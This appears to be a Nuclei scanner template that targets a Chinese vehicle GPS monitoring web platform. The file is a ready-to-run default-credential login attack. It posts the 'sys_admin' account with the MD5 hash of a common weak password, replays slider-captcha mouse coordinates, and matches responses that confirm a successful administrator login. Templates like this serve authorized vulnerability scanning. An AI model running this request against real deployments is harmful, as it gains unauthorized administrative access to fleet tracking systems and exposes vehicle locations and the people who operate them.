id: poc-yaml-31gps-login-default-password
info:
  name: 三一谦成 车辆监控服务平台 弱口令登录漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password,login

http:
  - raw:
      - |
        POST /gps-web/h5/login?_t= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"loginType":"user","userId":"sys_admin","password":"e10adc3949ba59abbe56e057f20f883e","rsaId":null,"plateColor":"1","smsCode":null,"code":[{"x":910,"y":409,"t":0},{"x":911,"y":409,"t":16},{"x":912,"y":409,"t":8},{"x":921,"y":409,"t":16},{"x":943,"y":406,"t":17},{"x":988,"y":401,"t":16},{"x":1046,"y":397,"t":17},{"x":1116,"y":395,"t":16},{"x":1183,"y":395,"t":17}],"imgId":"","imgCode":null,"loginLang":"zh_CN","loginWay":"ie","h5login":true}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "ok"
        part: body
      - type: dsl
        dsl:
          - "contains(find_json(body, 'result'), 'ok')"
          - "find_json(body, 'status') == 1"
          - "find_json(body, 'encry') == 'false'"
